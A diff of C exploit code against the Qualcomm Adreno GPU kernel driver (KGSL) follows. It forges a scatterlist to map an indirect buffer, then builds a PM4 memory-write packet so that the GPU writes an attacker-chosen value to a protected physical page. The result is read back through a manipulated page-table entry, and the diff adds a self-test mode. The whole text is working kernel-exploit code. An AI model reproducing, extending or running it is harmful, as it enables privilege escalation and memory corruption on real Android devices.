@@ -1445,12 +1445,10 @@ int try_cfi_stage(void) {
                       uint64_t ib_phys = (uint64_t)(ibpte & PTE_OA_MASK) & ~0xfffULL;
                       const char *vv = getenv("KGW_VAL");
                       uint32_t val = (uint32_t)strtoul(vv && *vv ? vv : "0x41", NULL, 0);
-                      ib[0] = (7u << 28) | (CP_MEM_WRITE << 16) | 3u;
-                      ib[1] = (uint32_t)m.gpuaddr;
-                      ib[2] = (uint32_t)(m.gpuaddr >> 32);
-                      ib[3] = val;
-                      pr_info("kgw: ib_phys=%016zx gpu_tgt=%016zx pm4=%08x %08x %08x %08x\n",
-                              (size_t)ib_phys, (size_t)m.gpuaddr, ib[0], ib[1], ib[2], ib[3]);
+                      const char *se = getenv("KGW_SELF");
+                      int self = (se && *se) ? 1 : 0;
+                      pr_info("kgw: ib_phys=%016zx gpu_tgt=%016zx self=%d\n",
+                              (size_t)ib_phys, (size_t)m.gpuaddr, self);
                       fsync(1);
                       /* second fire: forged scatterlist -> our IB page */
                       uint64_t ibpage = (uint64_t)VMEMMAP_START +
@@ -1464,6 +1462,17 @@ int try_cfi_stage(void) {
                       pr_info("kgw: ib map ret=%d gpuaddr=%016zx errno=%d\n",
                               r2, (size_t)m2.gpuaddr, errno); fsync(1);
                       if (r2 == 0 && m2.gpuaddr) {
+                        /* build the PM4 now: gpuaddr of the IB is known only here.
+                         * Target = the protected page, or (self test) 0x20 bytes
+                         * into this very IB page, which we can read from the CPU. */
+                        uint64_t writetgt = self ? (uint64_t)(m2.gpuaddr + 0x20)
+                                                 : (uint64_t)m.gpuaddr;
+                        ib[0] = (7u << 28) | (CP_MEM_WRITE << 16) | 3u;
+                        ib[1] = (uint32_t)writetgt;
+                        ib[2] = (uint32_t)(writetgt >> 32);
+                        ib[3] = val;
+                        pr_info("kgw: pm4=%08x %08x %08x %08x -> %016zx\n",
+                                ib[0], ib[1], ib[2], ib[3], (size_t)writetgt); fsync(1);
                         struct kgsl_drawctxt_create dc; memset(&dc, 0, sizeof dc);
                         dc.flags = 0x12;  /* KGSL_CONTEXT_PREAMBLE|NO_GMEM_ALLOC */
                         int rd = ioctl(gfd, IOCTL_KGSL_DRAWCTXT_CREATE_, &dc);
@@ -1480,15 +1489,11 @@ int try_cfi_stage(void) {
                           int ri = ioctl(gfd, IOCTL_KGSL_RINGBUFFER_ISSUEIBCMDS_, &ic);
                           pr_info("kgw: submit ret=%d ts=%u errno=%d\n",
                                   ri, ic.timestamp, errno); fsync(1);
-                          /* wait for the GPU to actually execute the IB */
-                          if (ri == 0) {
-                            struct kgsl_device_waittimestamp wt;
-                            wt.timestamp = ic.timestamp; wt.timeout = 2000;
-                            int rw = ioctl(gfd, IOCTL_KGSL_DEVICE_WAITTIMESTAMP_, &wt);
-                            pr_info("kgw: waittimestamp ret=%d errno=%d\n", rw, errno);
-                            fsync(1);
-                            usleep(200000);
-                          }
+                          if (ri == 0) usleep(500000);   /* let the CP run */
+                          if (self) {
+                            pr_info("kgw: SELFTEST ib[8]=%08x want=%08x\n",
+                                    ib[8], val); fsync(1);
+                          } else {
                           /* read the target page back in-process via a dirty PTE */
                           const char *sp2 = getenv("KGSL_SGT_PHYS");
                           uint64_t tphys = sp2 ? strtoull(sp2, NULL, 0) : 0;
@@ -1507,6 +1512,7 @@ int try_cfi_stage(void) {
                               fsync(1);
                               configfs_write_once(fd, rs, &rpte, 8);  /* restore */
                             }
+                          }
                           }
                         }
                       }
